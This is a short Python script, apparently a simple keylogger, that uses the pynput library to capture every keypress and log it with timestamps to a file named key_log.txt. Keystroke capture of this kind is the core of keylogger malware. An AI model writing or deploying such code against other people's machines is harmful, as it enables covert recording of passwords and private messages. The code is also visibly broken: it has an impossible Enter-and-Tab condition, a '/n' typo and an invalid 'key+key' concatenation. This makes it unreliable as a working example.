from pynput.keyboard import Key,Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    if key == Key.enter and key == Key.tab:
        print('/n')
        
    logging.info(key+key)

with Listener(on_press=on_press) as listener:
    listener.join()
